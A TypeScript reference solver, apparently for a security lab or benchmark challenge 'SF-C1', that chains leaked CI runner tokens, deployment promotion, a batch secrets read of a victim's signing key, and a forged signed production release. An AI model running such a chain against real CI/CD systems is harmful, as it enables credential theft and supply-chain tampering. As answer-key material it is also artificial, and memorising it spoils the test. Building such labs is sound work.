// SF-C1 reference solver: preview build -> env preview token -> promote -> batch secrets -> release.
import type { CompositeProofReceipt } from '../../../lib/types.ts'
import type { SolverContext } from './context.ts'
import { sleep } from './context.ts'

interface CiRunResponse {
  data?: {
    ciRun?: {
      id: string
      status: string
      envPreview?: { env?: string; runnerToken?: string }
    } | null
  }
}

export async function solveC1(ctx: SolverContext): Promise<CompositeProofReceipt | null> {
  const plan = ctx.lab.plan
  const prefix = plan.routePrefix
  const member = await ctx.login('member_a')

  const preview = await ctx.http('scm', `/repos/${plan.ids.projectIdA}/preview-builds`, {
    method: 'POST',
    token: member,
    body: { commit: 'refs/heads/main' },
  })
  if (preview.status !== 202) return null
  const buildId = preview.json<{ buildId: string }>().buildId

  let runnerToken = ''
  for (let attempt = 0; attempt < 120; attempt++) {
    const gql = await ctx.http('api', `${prefix}/graphql`, {
      method: 'POST',
      token: member,
      body: {
        query: 'query CiRun($id: ID!) { ciRun(id: $id) { id status envPreview { env runnerToken } } }',
        variables: { id: buildId },
      },
    })
    if (gql.status !== 200) return null
    const run = gql.json<CiRunResponse>().data?.ciRun
    if (run?.status === 'ready') {
      runnerToken = run.envPreview?.runnerToken ?? ''
      break
    }
    await sleep(15)
  }
  if (!runnerToken) return null

  const promote = await ctx.http('api', `${prefix}/deployments/${plan.ids.deploymentProdId}/promote`, {
    method: 'POST',
    token: runnerToken,
  })
  if (promote.status !== 200) return null
  const serviceAccount = promote.json<{ serviceAccountToken?: string }>().serviceAccountToken
  if (!serviceAccount) return null

  const batch = await ctx.http('api', `${prefix}/secrets/batch`, {
    method: 'POST',
    token: serviceAccount,
    body: { ids: [plan.ids.ownSecretId, plan.ids.victimSecretId], mutate: true },
  })
  if (batch.status !== 200) return null
  const processed = batch.json<{ processed: Array<{ id: string; value: string }> }>().processed
  const signingKey = processed.find((secret) => secret.id === plan.ids.victimSecretId)?.value
  if (!signingKey) return null

  const manifest = JSON.stringify({
    deployment: plan.ids.deploymentProdId,
    environment: 'prod',
    version: '2026.11.0',
    artifact: buildId,
  })
  const release = await ctx.http('api', `${prefix}/deployments/${plan.ids.deploymentProdId}/release`, {
    method: 'POST',
    token: serviceAccount,
    body: { manifest, signature: ctx.hmac(signingKey, manifest), version: '2026.11.0' },
  })
  if (release.status !== 200) return null

  return ctx.confirm('SF-C1')
}
